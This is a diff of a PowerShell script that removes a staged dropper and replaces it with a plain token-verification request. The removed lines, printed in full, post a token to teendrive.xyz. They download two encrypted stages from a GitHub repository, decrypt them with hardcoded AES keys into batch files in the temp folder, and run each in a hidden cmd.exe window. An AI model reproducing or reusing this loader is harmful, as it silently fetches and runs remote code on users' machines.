@@ -1,37 +1,16 @@
-if ($token) {
-    try {
-        Invoke-RestMethod -Uri "https://teendrive.xyz/api/verify" -Method Post -Body (@{token=$token} | ConvertTo-Json) -ContentType "application/json"
-    } catch {}
-}
+   if (-not $token) {
+       Write-Host "No token provided. Exiting."
+       exit 1
+   }
 
-$urls = @(
-    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage1"; out="batch1.enc"; dec="batch1.bat"; key="4bxXABIN1x7cBjVFt/787F931AXjgjp6tSI/ub3Ga7Q="; iv="Viuu5G6wiSV3CEAihlHG/w=="},
-    @{url="https://github.com/TeenDrive/TeenDrive/raw/refs/heads/main/stage2"; out="batch2.enc"; dec="batch2.bat"; key="oT58+VRk0I01+W343lpSl/SpMaJymx+N0oO4iJVPIUM="; iv="CaZcykeh8Cr5pkuoOTwddw=="}
-)
-$temp = $env:TEMP
+   $endpoint = "https://teendrive.xyz/api/verify"
+   $body = @{ token = $token } | ConvertTo-Json
 
-function D($u,$o,$d,$k,$i) {
-    Invoke-WebRequest $u -OutFile $o
-    $key = [Convert]::FromBase64String($k)
-    $iv = [Convert]::FromBase64String($i)
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.KeySize = 256
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aes.Key = $key
-    $aes.IV = $iv
-    $dec = $aes.CreateDecryptor()
-    $enc = [IO.File]::ReadAllBytes($o)
-    $ms = New-Object IO.MemoryStream
-    $cs = New-Object Security.Cryptography.CryptoStream($ms, $dec, [Security.Cryptography.CryptoStreamMode]::Write)
-    $cs.Write($enc, 0, $enc.Length)
-    $cs.Close()
-    [IO.File]::WriteAllBytes($d, $ms.ToArray())
-}
-
-foreach ($item in $urls) {
-    $out = Join-Path $temp $item.out
-    $dec = Join-Path $temp $item.dec
-    D $item.url $out $dec $item.key $item.iv
-    Start-Process cmd.exe -ArgumentList "/c `"$dec`"" -WindowStyle Hidden
-}
+   try {
+       $response = Invoke-RestMethod -Uri $endpoint -Method Post -Body $body -ContentType "application/json"
+       Write-Host "Verification sent! Server response:" -ForegroundColor Green
+       Write-Host $response
+   } catch {
+       Write-Host "Verification failed. Error:" -ForegroundColor Red
+       Write-Host $_
+   }
